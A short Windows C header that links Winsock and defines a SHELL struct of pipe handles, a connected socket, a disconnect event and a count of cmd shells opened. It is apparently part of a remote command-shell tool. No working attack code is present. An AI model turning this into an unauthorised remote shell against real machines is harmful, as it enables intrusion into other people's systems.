#pragma once
#define _WINSOCKAPI_    

#include "resource.h"

#pragma comment(lib, "Ws2_32.lib")

typedef struct _Shell{
	HANDLE hParentRead;
	HANDLE hParentWrite;
	SOCKET sConnect;
	HANDLE hServerBrokenEvent;
	DWORD cmdStack;//how many cmd shell called
}SHELL;